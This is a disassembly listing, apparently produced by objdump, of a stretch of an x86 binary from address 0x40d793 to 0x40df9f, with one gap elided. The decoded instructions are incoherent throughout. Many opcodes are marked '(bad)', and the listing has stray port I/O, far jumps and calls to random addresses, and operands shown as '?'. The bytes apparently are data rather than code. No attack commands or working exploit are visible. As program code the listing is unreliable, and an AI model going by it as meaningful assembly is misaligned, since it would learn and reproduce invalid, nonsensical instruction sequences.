  40d793:	repnz rol WORD PTR [ebp+0x7f0e91b4],cl
  40d79b:	iret   
  40d79c:	test   al,0x75
  40d79e:	adc    BYTE PTR [eax-0x4ca8d1e6],ch
  40d7a4:	ror    DWORD PTR [ecx],1
  40d7a6:	sub    al,0xb2
  40d7a8:	add    BYTE PTR [eax+ebp*1+0x21],dl
  40d7ac:	imul   ebp,esi,0xe2bf7d9a
  40d7b2:	xchg   esi,eax
  40d7b3:	inc    esi
  40d7b4:	push   esp
  40d7b5:	test   BYTE PTR [ebx+0x67],al
  40d7b8:	(bad)  
  40d7b9:	mov    ?,WORD PTR [edx-0x2ef1d499]
  40d7bf:	push   ecx
  40d7c0:	mov    esp,0x304a3be8
  40d7c5:	das    
  40d7c6:	jle    0x40d76c
  40d7c8:	or     edi,DWORD PTR [esi+eiz*4]
  40d7cb:	push   es
  40d7cc:	scas   al,BYTE PTR es:[edi]
  40d7cd:	push   edi
  40d7ce:	pop    eax
  40d7cf:	rcr    BYTE PTR ds:0x448c8fab,cl
  40d7d5:	xor    BYTE PTR ds:0x527366f2,0x40
  40d7dc:	stos   DWORD PTR es:[edi],eax
  40d7dd:	sub    DWORD PTR [edx-0x1a135a83],eax
  40d7e3:	adc    DWORD PTR [edx],esi
  40d7e5:	pop    esp
  40d7e6:	(bad)  
  40d7e7:	lock enter 0x40f7,0xfd
  40d7ec:	mov    dl,bl
  40d7ee:	or     DWORD PTR [ebx+0x1d],esp
  40d7f1:	push   ebp
  40d7f2:	xor    edx,ecx
  40d7f4:	outs   dx,BYTE PTR ds:[esi]
  40d7f5:	neg    BYTE PTR [edi-0xbed868]
  40d7fb:	les    eax,FWORD PTR ds:0xbdcc71ba
  40d801:	cmp    al,0x15
  40d803:	js     0x40d7ab
  40d805:	(bad)  
  40d806:	mov    ah,0x80
  40d808:	or     eax,0xf830ddf
  40d80d:	lea    ecx,[edi+eiz*4-0x1ebe80d6]
  40d814:	push   es
  40d815:	mov    ah,0x89
  40d817:	js     0x40d7b6
  40d819:	shl    DWORD PTR [ebp+0xff8d89],0x93
  40d820:	mov    al,ds:0xc9538510
  40d825:	in     al,0xe6
  40d827:	aam    0x69
  40d829:	jmp    0x40d7c3
  40d82b:	stos   BYTE PTR es:[edi],al
  40d82c:	std    
  40d82d:	sahf   
  40d82e:	mov    al,0x43
  40d830:	xchg   esp,eax
  40d831:	(bad)  
  40d832:	mov    edx,0xb4083f1d
  40d837:	and    al,0xf7
  40d839:	lods   eax,DWORD PTR ds:[esi]
  40d83a:	ins    BYTE PTR es:[edi],dx
  40d83b:	es ret 0x8377
  40d83f:	mov    esp,0x71b413d5
  40d844:	push   ss
  40d845:	sbb    ecx,DWORD PTR [edx-0x76]
  40d848:	pop    ds
  40d849:	xor    BYTE PTR [ebx],dh
  40d84b:	inc    edx
  40d84c:	mov    ah,0xfa
  40d84e:	call   0xb3932f86
  40d853:	(bad)  
  40d854:	in     eax,dx
  40d855:	in     al,dx
  40d856:	out    0xdf,eax
  40d858:	pop    ds
  40d859:	adc    BYTE PTR [edi-0x3],0x64
  40d85d:	pusha  
  40d85e:	xchg   DWORD PTR [ebx+0x145f7ae4],eax
  40d864:	jg     0x40d890
  40d866:	lds    esp,FWORD PTR [ebp+ebx*1+0x35]
  40d86a:	mov    al,0x4c
  40d86c:	das    
  40d86d:	sub    eax,0x82c61216
  40d872:	cdq    
  40d873:	(bad)  
  40d874:	addr16 mov al,ds:0x9a42
  40d878:	out    0x2,eax
  40d87a:	aas    
  40d87b:	ja     0x40d88c
  40d87d:	and    BYTE PTR [eax],bh
  40d87f:	dec    ebp
  40d880:	ficom  WORD PTR [edx+0x4b73f8a4]
  40d886:	(bad)  
  40d887:	push   eax
  40d888:	and    esp,DWORD PTR [ebx+ebp*8-0x4d]
  40d88c:	dec    eax
  40d88d:	mov    ?,esp
  40d88f:	mov    ah,0x22
  40d891:	pushf  
  40d892:	(bad)  
  40d893:	cmc    
  40d894:	arpl   WORD PTR [ebx-0x6b],sp
  40d897:	sub    esp,esi
  40d899:	push   eax
  40d89a:	xchg   edx,eax
  40d89b:	fisttp DWORD PTR [ecx-0x6c]
  40d89e:	jo     0x40d8b6
  40d8a0:	call   0x9d61:0xa3c8f74c
  40d8a7:	popf   
  40d8a8:	cmp    cl,BYTE PTR [eax+0x1346985a]
  40d8ae:	cmp    BYTE PTR [edx+0x2e],0xce
  40d8b2:	xchg   esp,eax
  40d8b3:	adc    ebx,eax
  40d8b5:	xchg   ebx,eax
  40d8b6:	sub    al,0x20
  40d8b8:	adc    DWORD PTR [ecx],0x5e6c90a7
  40d8be:	popf   
  40d8bf:	lock sbb eax,DWORD PTR [esi]
  40d8c2:	std    
  40d8c3:	mov    ah,0x81
  40d8c5:	mov    ah,0x28
  40d8c7:	lods   al,BYTE PTR ds:[esi]
  40d8c8:	dec    ecx
  40d8c9:	xlat   BYTE PTR ds:[ebx]
  40d8ca:	adc    al,0x56
  40d8cc:	xlat   BYTE PTR ss:[ebx]
  40d8ce:	and    cl,BYTE PTR [edx]
  40d8d0:	mov    bl,0x19
  40d8d2:	aad    0xfa
  40d8d4:	sbb    ah,BYTE PTR [ebx-0x47ae7c0b]
  40d8da:	arpl   WORD PTR [eax-0x1c],dx
  40d8dd:	popa   
  40d8de:	push   fs
  40d8e0:	fwait
  40d8e1:	aas    
  40d8e2:	bound  ebp,QWORD PTR [edx+0x30108349]
  40d8e8:	xchg   edi,eax
  40d8e9:	xor    DWORD PTR [eax],esi
  40d8eb:	(bad)  
  40d8ec:	xchg   ecx,eax
  40d8ed:	mov    ebp,0x4bb5b3ac
  40d8f2:	scas   al,BYTE PTR es:[edi]
  40d8f3:	iret   
  40d8f4:	out    0x61,al
  40d8f6:	sbb    ebx,eax
  40d8f8:	imul   esi,DWORD PTR [edx-0x1189df3],0xe68e6eee
  40d902:	pop    ebx
  40d903:	mov    dh,0xbe
  40d905:	pop    esp
  40d906:	loopne 0x40d8e1
  40d908:	imul   esi,DWORD PTR [esi-0x7eac830d],0x6e
  40d90f:	in     al,0x24
  40d911:	les    edi,FWORD PTR [edx+0x43f13a07]
  40d917:	cwde   
  40d918:	pop    edi
  40d919:	inc    ebp
  40d91a:	or     DWORD PTR [ebp+0x3c1824d9],ecx
  40d920:	mov    ds:0x8a4f9a78,eax
  40d925:	mov    eax,ds:0x234ec7eb
  40d92a:	aaa    
  40d92b:	mov    ds:0x251ea999,al
  40d930:	stos   BYTE PTR es:[edi],al
  40d931:	les    ebp,FWORD PTR [ebp+0x37c149ea]
  40d937:	and    bl,BYTE PTR [ebx+0x24]
  40d93a:	ret    0x62b4
  40d93d:	jnp    0x40d919
  40d93f:	or     al,0x92
  40d941:	inc    eax
  40d942:	mov    ebp,DWORD PTR [edx-0x6797fa4e]
  40d948:	and    esi,DWORD PTR [edx]
  40d94a:	push   ecx
  40d94b:	stos   BYTE PTR es:[edi],al
  40d94c:	push   ss
  40d94d:	add    eax,0x96ac60b0
  40d952:	aas    
  40d953:	imul   edx,DWORD PTR [eax],0xffffffc4
  40d956:	cwde   
  40d957:	cmp    ah,dl
  40d959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d95a:	cmp    esp,DWORD PTR [eax]
  40d95c:	jmp    0x6be8:0x9941cefd
  40d963:	sbb    DWORD PTR ds:0xdcb2b577,esp
  40d969:	and    BYTE PTR [ebx],ah
  40d96b:	sti    
  40d96c:	mov    cl,0x75
  40d96e:	iret   
  40d96f:	test   dh,dh
  40d971:	cwde   
  40d972:	push   edx
  40d973:	push   ds
  40d974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d975:	enter  0x525e,0x97
  40d979:	sti    
  40d97a:	pop    ebp
  40d97b:	test   al,0x5a
  40d97d:	retf   
  40d97e:	ror    BYTE PTR [ebp-0x17ec4c7e],0x95
  40d985:	push   edi
  40d986:	iret   
  40d987:	int    0x6e
  40d989:	sub    ah,BYTE PTR [esi+0x9]
  40d98c:	ja     0x40d95a
  40d98e:	cmp    al,0xb3
  40d990:	mov    al,0xe7
  40d992:	out    0x11,al
  40d994:	cdq    
  40d995:	arpl   WORD PTR [edi-0x4785e08a],si
  40d99b:	aam    0xaf
  40d99d:	aaa    
  40d99e:	mov    ecx,es
  40d9a0:	fisub  WORD PTR [ebx-0x26]
  40d9a3:	sbb    BYTE PTR [edi+ebp*4-0x5f],0x7c
  40d9a8:	pushf  
  40d9a9:	adc    DWORD PTR [ecx],esi
  40d9ab:	out    dx,eax
  40d9ac:	jo     0x40d9c4
  40d9ae:	(bad)
  40d9b2:	push   ss
  40d9b3:	or     DWORD PTR [ebp+0x3d9fee7b],ecx
  40d9b9:	cs popf 
  40d9bb:	iret   
  40d9bc:	test   bl,cl
  40d9be:	mov    ebx,0xa2237ba
  40d9c3:	out    0xef,eax
  40d9c5:	inc    ecx
  40d9c6:	jmp    0x40da14
  40d9c8:	mov    eax,ds:0xe27278c0
  40d9cd:	in     eax,dx
  40d9ce:	dec    esp
  40d9cf:	inc    edx
  40d9d0:	mov    esi,0x49e3f69d
  40d9d5:	xchg   esi,eax
  40d9d6:	push   edi
  40d9d7:	bound  esp,QWORD PTR [ebx]
  40d9d9:	and    ah,0x5
  40d9dc:	nop
  40d9dd:	sar    edi,0xb8
  40d9e0:	mov    edx,0x1d80f46a
  40d9e5:	xor    esi,DWORD PTR [edi]
  40d9e7:	dec    ebp
  40d9e8:	pop    ebp
  40d9e9:	cld    
  40d9ea:	dec    ebx
  40d9eb:	pop    esi
  40d9ec:	dec    ebx
  40d9ed:	jne    0x40d982
  40d9ef:	mov    cl,0x54
  40d9f1:	imul   eax,DWORD PTR [ebp-0x32ba8dec],0xffffffa9
  40d9f8:	lods   al,BYTE PTR ds:[esi]
  40d9f9:	icebp  
  40d9fa:	ins    BYTE PTR es:[edi],dx
  40d9fb:	scas   al,BYTE PTR es:[edi]
  40d9fc:	xor    eax,0x9bb5a9cc
  40da01:	push   0x657c9dc
  40da06:	stos   DWORD PTR es:[edi],eax
  40da07:	mov    BYTE PTR [ebx-0x383e446a],ah
  40da0d:	sub    eax,0x6089f574
  40da12:	adc    eax,0xe84e1f34
  40da17:	xchg   edx,eax
  40da18:	push   esi
  40da19:	cwde   
  40da1a:	gs push eax
  40da1c:	or     DWORD PTR [ebx+0x620aaad7],ecx
  40da22:	mov    dl,0x8c
  40da24:	push   cs
  40da25:	dec    ebx
  40da26:	xchg   BYTE PTR [esi+0x32],dl
  40da29:	sub    al,0x48
  40da2b:	ja     0x40da50
  40da2d:	xor    eax,0xb70d5c84
  40da32:	adc    BYTE PTR [edi-0x30794a0e],ch
  40da38:	shl    BYTE PTR [edi+0x7b6f9863],1
  40da3e:	das    
  40da3f:	xor    ch,BYTE PTR [edi+0x76]
  40da42:	dec    edi
  40da43:	mov    bh,0x5e
  40da45:	push   ss
  40da46:	jg     0x40da3d
  40da48:	jne    0x40da85
  40da4a:	sub    al,0xb6
  40da4c:	dec    edi
  40da4d:	ss jg  0x40d9dd
  40da50:	pop    es
  40da51:	call   FWORD PTR [esi-0x5b52a2]
  40da57:	xor    edx,DWORD PTR ds:[esi-0x6e]
  40da5b:	jnp    0x40da9c
  40da5d:	dec    edi
  40da5e:	xchg   edi,eax
  40da5f:	pop    ebp
  40da60:	fisub  DWORD PTR [edi]
  40da62:	add    BYTE PTR [eax+0x2c],cl
  40da65:	call   0xb3297970
  40da6a:	jo     0x40da5b
  40da6c:	(bad)  
  40da6d:	lods   al,BYTE PTR ds:[esi]
  40da6e:	rol    BYTE PTR [edi+0x30d90c82],1
  40da74:	icebp  
  40da75:	pop    ds
  40da76:	mov    esp,0xc874c0c6
  40da7b:	add    BYTE PTR [ecx],0xe1
  40da7e:	stc    
  40da7f:	dec    edi
  40da80:	mov    eax,ds:0x31d2ead0
  40da85:	int3   
  40da86:	lods   al,BYTE PTR ds:[esi]
  40da87:	sub    ebx,esi
  40da89:	call   0x8c9e07a0
  40da8e:	mov    fs,WORD PTR ds:0xcd33a710
  40da94:	scas   al,BYTE PTR es:[edi]
  40da95:	xchg   ebx,eax
  40da96:	loope  0x40da20
  40da98:	in     al,dx
  40da99:	repnz pop edi
  40da9b:	ret    0xe395
  40da9e:	pusha  
  40da9f:	mov    edx,0x912a4e1
  40daa4:	retf   0x820e
  40daa7:	sub    eax,0xb2a99272
  40daac:	clc    
  40daad:	mov    al,0x88
  40daaf:	sbb    bh,ah
  40dab1:	(bad)  
  40dab2:	adc    ah,BYTE PTR [ebp-0x67fb4da9]
  40dab8:	jns    0x40db12
  40daba:	lahf   
  40dabb:	adc    eax,DWORD PTR [esp+eiz*2-0x61609fd2]
  40dac2:	mov    dh,ah
  40dac4:	sbb    al,0x3a
  40dac6:	jg     0x40da55
  40dac8:	sub    edx,DWORD PTR [ebp-0x1f]
  40dacb:	ins    BYTE PTR es:[edi],dx
  40dacc:	dec    ecx
  40dacd:	mov    ebp,0x66a6dc88
  40dad2:	imul   esp,DWORD PTR [ebx+esi*2],0x45
  40dad6:	shr    BYTE PTR [ebx+0x5240c11d],1
  40dadc:	out    0x85,eax
  40dade:	ret    0xbe8a
  40dae1:	sbb    DWORD PTR [edx+0x41],ebx
  40dae4:	neg    DWORD PTR [edx-0x67]
  40dae7:	out    dx,eax
  40dae8:	pusha  
  40dae9:	lods   eax,DWORD PTR ds:[esi]
  40daea:	push   es
  40daeb:	(bad)  
  40daec:	xor    al,0xdc
  40daee:	sbb    DWORD PTR [esp+edx*1-0x61d6fb48],ebx
  40daf5:	pop    ss
  40daf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf7:	pop    ecx
  40daf8:	mov    eax,ds:0xf19d0337
  40dafd:	or     al,0x63
  40daff:	les    edx,FWORD PTR [ebp+0x3a930e6b]
  40db05:	or     BYTE PTR [ecx+0x5b],ah
  40db08:	sub    BYTE PTR [edi-0x13],ch
  40db0b:	push   ecx
  40db0c:	retf   0x232e
  40db0f:	in     eax,0x8b
  40db11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db12:	scas   al,BYTE PTR es:[edi]
  40db13:	iret   
  40db14:	fild   QWORD PTR [ecx]
  40db16:	js     0x40daf7
  40db18:	cwde   
  40db19:	xchg   edi,eax
  40db1a:	ja     0x40dadf
  40db1c:	sub    al,0x78
  40db1e:	jle    0x40db15
  40db20:	les    eax,FWORD PTR [ebp-0x18]
  40db23:	aaa    
  40db24:	out    0xb3,eax
  40db26:	dec    esi
  40db27:	add    esi,DWORD PTR [ebx+0x73183c38]
  40db2d:	sbb    al,0x89
  40db2f:	add    DWORD PTR ds:0xa2a69d7f,esp
  40db35:	clc    
  40db36:	adc    al,0x15
  40db38:	jo     0x40dacf
  40db3a:	push   ds
  40db3b:	dec    ecx
  40db3c:	ins    DWORD PTR es:[edi],dx
  40db3d:	mov    eax,ds:0x9f621691
  40db42:	sub    eax,0x791145eb
  40db47:	lahf   
  40db48:	popf   
  40db49:	iret   
  40db4a:	loopne 0x40db61
  40db4c:	ss jne 0x40daf2
  40db4f:	les    ebx,FWORD PTR [edx-0x56e1d303]
  40db55:	mov    ebp,0x7801361e
  40db5a:	mov    ebp,0x823ce932
  40db5f:	mov    dh,0x5
  40db61:	xchg   edx,eax
  40db62:	(bad)  
  40db63:	ror    ebp,cl
  40db65:	push   edx
  40db66:	cmp    al,0x95
  40db68:	mov    eax,0x5c44b5da
  40db6d:	push   eax
  40db6e:	add    ch,BYTE PTR [ecx+0x62]
  40db71:	rcr    bl,1
  40db73:	leave  
  40db74:	dec    ebp
  40db75:	push   eax
  40db76:	(bad)  
  40db77:	ja     0x40db9d
  40db79:	scas   eax,DWORD PTR es:[edi]
  40db7a:	pop    ss
  40db7b:	jmp    0x40dbf3
  40db7d:	int    0xc8
  40db7f:	sub    eax,0xcb785af3
  40db84:	inc    edi
  40db85:	mov    ds:0x55fd0528,al
  40db8a:	fisttp WORD PTR [ecx]
  40db8c:	lock (bad) 
  40db8e:	jmp    0x40db8e
  40db90:	retf   
  40db91:	mov    cl,0xa6
  40db93:	mov    ds:0x64db6a92,al
  40db98:	fidiv  WORD PTR [ecx-0x57]
  40db9b:	xchg   edi,eax
  40db9c:	cli    
  40db9d:	bound  edx,QWORD PTR [ebp-0x69379367]
  40dba3:	enter  0x2c,0xce
  40dba7:	adc    dh,BYTE PTR [ebx]
  40dba9:	faddp  st(0),st
  40dbab:	mov    bl,0x52
  40dbad:	(bad)  
  40dbae:	mov    al,0x8a
  40dbb0:	pop    eax
  40dbb1:	push   ds
  40dbb2:	or     al,0x6f
  40dbb4:	dec    eax
  40dbb5:	inc    esi
  40dbb6:	cmp    ebx,0xffffff80
  40dbb9:	pop    es
  40dbba:	cmp    dh,BYTE PTR [esi-0x13f3fc4b]
  40dbc0:	call   0x9a25:0xe2a24d97
  40dbc7:	sbb    DWORD PTR [eax-0xcb18107],eax
  40dbcd:	xor    DWORD PTR [ebp+0x73140192],0xe4547e57
  40dbd7:	cmp    al,0x16
  40dbd9:	call   FWORD PTR [ebp-0x56a27c96]
  40dbdf:	dec    edx
  40dbe1:	xchg   esp,eax
  40dbe2:	lds    edi,FWORD PTR [edi+edi*4]
  40dbe5:	shr    DWORD PTR ds:0x5890fdf3,0xc7
  40dbec:	fnsave [esi+0x7cccac3d]
  40dbf2:	add    BYTE PTR [edi-0x61],ch
  40dbf5:	stos   DWORD PTR es:[edi],eax
  40dbf6:	pop    edi
  40dbf7:	and    BYTE PTR [ebp-0x34f92551],0x1f
  40dbfe:	cmc    
  40dbff:	test   al,0x45
  40dc01:	jle    0x40dc49
  40dc03:	sbb    al,BYTE PTR [ecx+0x2d]
  40dc06:	mov    bh,0x8a
  40dc08:	cmp    ecx,esi
  40dc0a:	stos   DWORD PTR es:[edi],eax
  40dc0b:	pop    ds
  40dc0c:	sub    BYTE PTR [eax],0xfa
  40dc0f:	mov    eax,0x1badd804
  40dc14:	mov    cl,0x62
  40dc16:	and    DWORD PTR [esi+0x45],esi
  40dc19:	xor    al,BYTE PTR [ebx+0x2e433ef0]
  40dc1f:	sub    bh,BYTE PTR [ebp+0x56]
  40dc22:	jle    0x40dc7a
  40dc24:	sub    esp,DWORD PTR [ecx+0x5bdb73c6]
  40dc2a:	inc    esi
  40dc2b:	mov    esp,0xede99571
  40dc30:	mov    edi,0x1eb94e9b
  40dc35:	divps  xmm5,xmm5
  40dc38:	xor    dl,dh
  40dc3a:	ins    DWORD PTR es:[edi],dx
  40dc3b:	jmp    0x7cd4:0x18d325a2
  40dc42:	pop    ebp
  40dc43:	pop    ds
  40dc44:	mov    eax,0xd65aa5e4
  40dc49:	das    
  40dc4a:	pop    eax
  40dc4b:	outs   dx,BYTE PTR ds:[esi]
  40dc4c:	inc    esi
  40dc4d:	xchg   dh,al
  40dc4f:	aas    
  40dc50:	and    BYTE PTR [eax-0x3c005c91],bh
  40dc56:	jmp    0x622f383a
  40dc5b:	xlat   BYTE PTR ds:[ebx]
  40dc5c:	jecxz  0x40dc59
  40dc5e:	jae    0x40dbe5
  40dc60:	fnstsw WORD PTR [eax]
  40dc62:	in     al,dx
  40dc63:	xor    al,0x6a
  40dc65:	fcom   DWORD PTR [edi*4-0x3c6de789]
  40dc6c:	fidiv  DWORD PTR ds:0xa4c8668b
  40dc72:	gs xchg ecx,eax
  40dc74:	(bad)  
  40dc75:	and    DWORD PTR [ebp-0x2c],edi
  40dc78:	rcl    eax,0xe9
  40dc7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc7c:	push   ds
  40dc7d:	inc    edx
  40dc7e:	push   edx
  40dc7f:	int    0x3e
  40dc81:	pop    ebx
  40dc82:	jle    0x40dc22
  40dc84:	push   0xfbdd5453
  40dc89:	or     al,BYTE PTR ds:0x46ab6f3e
  40dc8f:	or     DWORD PTR [ebp+0x58f8f4bb],ecx
  40dc95:	lds    ecx,FWORD PTR [edx]
	...
  40dd13:	add    ah,cl
  40dd15:	(bad)
  40dd1a:	into   
  40dd1b:	imul   DWORD PTR [ecx+0x1c5c4e4c]
  40dd21:	and    DWORD PTR [ebp+0x1],ecx
  40dd24:	inc    eax
  40dd25:	mov    eax,DWORD PTR [eax]
  40dd27:	add    BYTE PTR [ebx+0x7],ch
  40dd2a:	add    BYTE PTR [eax],al
  40dd2c:	nop
  40dd2d:	dec    ebp
  40dd2e:	mov    ds:0xf4e9685d,al
  40dd33:	(bad)  
  40dd34:	inc    eax
  40dd35:	pop    ds
  40dd36:	and    DWORD PTR [ecx+eiz*1-0x5],0xee211527
  40dd3e:	ss jecxz 0x40dd6f
  40dd41:	repnz stos BYTE PTR es:[edi],al
  40dd43:	aam    0x6
  40dd45:	mov    ecx,0x26aaa387
  40dd4a:	push   ebp
  40dd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd4c:	sbb    BYTE PTR [eax],al
  40dd4e:	fld    QWORD PTR [edx+0x7]
  40dd51:	dec    edx
  40dd52:	in     eax,dx
  40dd53:	lahf   
  40dd54:	sub    edi,eax
  40dd56:	mov    dh,0x24
  40dd58:	andps  xmm6,XMMWORD PTR [ebx-0x3bf4cffd]
  40dd5f:	cmp    eax,0xbaac2ac9
  40dd64:	fcomp  QWORD PTR [ecx+0x35ee92b7]
  40dd6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd6b:	lahf   
  40dd6c:	or     al,0x3d
  40dd6e:	xchg   edi,eax
  40dd6f:	aas    
  40dd70:	xchg   esp,eax
  40dd71:	cmp    eax,0xe033031e
  40dd76:	pop    ds
  40dd77:	add    ch,BYTE PTR [esi]
  40dd79:	xor    eax,0x69cf6d5d
  40dd7e:	je     0x40dd93
  40dd80:	out    dx,al
  40dd81:	mov    eax,0x1acaafff
  40dd86:	xchg   edi,eax
  40dd87:	fstp   DWORD PTR [ecx+0x1e7ecbb8]
  40dd8d:	push   ecx
  40dd8e:	fs pop edx
  40dd90:	cmp    DWORD PTR [esi+0x505b5cde],0xffffffd5
  40dd97:	jmp    0x40ddb4
  40dd99:	xchg   edi,eax
  40dd9a:	ss clc 
  40dd9c:	jmp    0x6feb49ec
  40dda1:	cmp    eax,DWORD PTR [ecx-0x7c]
  40dda4:	cwde   
  40dda5:	cmp    BYTE PTR ds:0xf8e8db2c,cl
  40ddab:	sub    dl,BYTE PTR [ebx-0x77912db8]
  40ddb1:	fs jns 0x40ddbb
  40ddb4:	dec    DWORD PTR [ecx]
  40ddb6:	sti    
  40ddb7:	sahf   
  40ddb8:	xor    DWORD PTR [ebx],ebp
  40ddba:	push   edi
  40ddbb:	xchg   edx,eax
  40ddbc:	pop    eax
  40ddbd:	add    eax,0x38b19bb8
  40ddc2:	(bad)  [ebx-0x4ef3ce02]
  40ddc8:	cmp    al,0xbd
  40ddca:	jo     0x40ddfd
  40ddcc:	cmc    
  40ddcd:	pop    edi
  40ddce:	xchg   esi,eax
  40ddcf:	sbb    esp,DWORD PTR [ecx+0x17]
  40ddd2:	add    eax,0xe16118d5
  40ddd7:	rcl    DWORD PTR [esi+0x6f],cl
  40ddda:	pop    esp
  40dddb:	mov    dh,0x5d
  40dddd:	adc    bh,BYTE PTR [edi]
  40dddf:	sbb    al,0x23
  40dde1:	shl    DWORD PTR [edx+0x70],0x40
  40dde5:	clc    
  40dde6:	loop   0x40dd9d
  40dde8:	popa   
  40dde9:	ficomp WORD PTR [ebx]
  40ddeb:	nop
  40ddec:	fcomp  DWORD PTR [ebp+0x7]
  40ddef:	into   
  40ddf0:	daa    
  40ddf1:	(bad)  [edi]
  40ddf3:	rol    DWORD PTR [ecx+0x5df16ba7],1
  40ddf9:	enter  0xfa98,0x23
  40ddfd:	je     0x40de6a
  40ddff:	repnz or al,0x7a
  40de02:	scas   al,BYTE PTR es:[edi]
  40de03:	mov    esi,0xe9be46a1
  40de08:	out    dx,al
  40de09:	es and al,0x8d
  40de0c:	sbb    BYTE PTR [ecx+0x45],bh
  40de0f:	in     al,dx
  40de10:	test   al,0xc7
  40de12:	gs sub eax,0xb2b529bc
  40de18:	call   0x12e2cd04
  40de1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de1e:	stc    
  40de1f:	cli    
  40de20:	mov    ds:0xb9ae12f4,al
  40de25:	mov    DWORD PTR [edi+edx*8],ecx
  40de28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de29:	mov    al,0xd3
  40de2b:	jmp    0x1f22b52f
  40de30:	fstp   TBYTE PTR [esi-0x3]
  40de33:	or     DWORD PTR ds:0xd433516f,ebp
  40de39:	add    BYTE PTR [eax],0x5b
  40de3c:	ret    
  40de3d:	cmc    
  40de3e:	fbstp  TBYTE PTR [ebx]
  40de40:	pusha  
  40de41:	xor    BYTE PTR [edx],bh
  40de43:	jbe    0x40de3b
  40de45:	adc    edx,edx
  40de47:	add    dl,BYTE PTR [ecx]
  40de49:	rcl    DWORD PTR [edx-0x32],cl
  40de4c:	aam    0xb9
  40de4e:	push   ds
  40de4f:	mov    bh,0x16
  40de51:	xlat   BYTE PTR ds:[ebx]
  40de52:	imul   ebx,DWORD PTR [eax+edi*1-0x6e],0x8d89ebc
  40de5a:	test   DWORD PTR [edi],0x88818844
  40de60:	call   0x93f4:0x5fbb64a
  40de67:	jmp    0x4f31bd5
  40de6c:	mov    esp,0xa28fb771
  40de71:	inc    ebp
  40de72:	mov    eax,0x36b86d1f
  40de77:	push   esi
  40de78:	jo     0x40de74
  40de7a:	adc    DWORD PTR [ebx+0x1c39b868],0x3b16be8b
  40de84:	shr    DWORD PTR [edx-0x1a],1
  40de87:	inc    edx
  40de88:	adc    BYTE PTR [edi],ah
  40de8a:	ror    DWORD PTR [edx+0x18],0x56
  40de8e:	sbb    DWORD PTR [esi-0x42ae06ab],ebp
  40de94:	cli    
  40de95:	inc    esi
  40de96:	int    0x7d
  40de98:	fstp   QWORD PTR [eax+0x4bfe330f]
  40de9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de9f:	add    eax,0x475e85cb
  40dea4:	xchg   ecx,ebp
  40dea6:	add    DWORD PTR [eax],esi
  40dea8:	mov    ecx,0xba93021e
  40dead:	jmp    0xfa5d:0x30f71ad7
  40deb4:	jg     0x40de3c
  40deb6:	pop    esi
  40deb7:	sub    ch,dl
  40deb9:	std    
  40deba:	mov    ch,0x8
  40debc:	jmp    0xa94a:0xed119bf2
  40dec3:	out    0x11,eax
  40dec5:	cli    
  40dec6:	xchg   esp,eax
  40dec7:	dec    eax
  40dec8:	pop    edx
  40dec9:	mov    al,0x14
  40decb:	pop    ecx
  40decc:	cmp    ecx,DWORD PTR [ebx-0x1d]
  40decf:	ficom  WORD PTR [esi-0x65]
  40ded2:	in     al,0xef
  40ded4:	std    
  40ded5:	pop    ss
  40ded6:	push   esp
  40ded7:	inc    ebp
  40ded8:	iret   
  40ded9:	fnsave [ebx]
  40dedb:	mov    eax,0xb2b15215
  40dee0:	or     ch,dl
  40dee2:	pushw  0xc106
  40dee6:	or     al,0x6f
  40dee8:	std    
  40dee9:	adc    eax,0x6b61fbc2
  40deee:	sti    
  40deef:	loopne 0x40df52
  40def1:	mov    bl,0x88
  40def3:	and    al,0xaf
  40def5:	xor    ebp,DWORD PTR [esi-0x3b0bd747]
  40defb:	test   al,0xdb
  40defd:	pop    esi
  40defe:	and    dl,BYTE PTR [ebp+0x2]
  40df01:	jb     0x40de8d
  40df03:	fst    DWORD PTR [ebp-0x43a76524]
  40df09:	mov    ah,0xdc
  40df0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df0c:	mov    ?,WORD PTR [ebp-0x9]
  40df0f:	fwait
  40df10:	ret    0x9ecc
  40df13:	in     al,0xea
  40df15:	sahf   
  40df16:	inc    esp
  40df17:	cs xor eax,0x251c0306
  40df1d:	jl     0x40dea8
  40df1f:	fdiv   QWORD PTR [ebx+0x74]
  40df22:	in     al,0x35
  40df24:	test   BYTE PTR [ebp+0x39],al
  40df27:	gs loop 0x40df3f
  40df2a:	(bad)  
  40df2b:	fwait
  40df2c:	pop    ss
  40df2d:	shr    DWORD PTR [ecx-0x49],0x96
  40df31:	or     eax,0xc6965222
  40df36:	and    DWORD PTR [ebx+ebp*1],edi
  40df39:	inc    esp
  40df3b:	sti    
  40df3c:	or     eax,0x197c151
  40df41:	inc    eax
  40df42:	or     eax,0x42f28043
  40df47:	sub    ebx,DWORD PTR [ecx-0x2328ac94]
  40df4d:	nop
  40df4e:	aas    
  40df4f:	mov    dl,0xf0
  40df51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df52:	xchg   esp,eax
  40df53:	dec    ecx
  40df54:	das    
  40df55:	(bad)  
  40df56:	ficomp DWORD PTR [edi+0x62df0fd9]
  40df5c:	xor    eax,0xa042dad8
  40df61:	or     BYTE PTR [esi+esi*8-0x2],al
  40df65:	adc    al,bh
  40df67:	mov    esp,DWORD PTR [eax+0x75]
  40df6a:	adc    bh,bl
  40df6c:	out    dx,eax
  40df6d:	bound  edx,QWORD PTR [eax+0x71]
  40df70:	pop    edi
  40df71:	int3   
  40df72:	mov    edx,0x88e212e8
  40df77:	rol    DWORD PTR [esp+eiz*4],cl
  40df7a:	mov    esi,0x263122e1
  40df7f:	pop    ebx
  40df80:	jne    0x40df9b
  40df82:	fstp   DWORD PTR [esi+0x53a409e0]
  40df88:	sub    al,0x56
  40df8a:	adc    eax,0xcf35a89e
  40df8f:	and    bh,bh
  40df91:	cmp    DWORD PTR [ebp+0x29f12f0a],edi
  40df97:	aaa    
  40df98:	iret   
  40df99:	xor    BYTE PTR [eax-0x62],bh
  40df9c:	mov    bh,dl
  40df9e:	in     eax,dx
  40df9f:	xlat   BYTE PTR ds:[ebx]
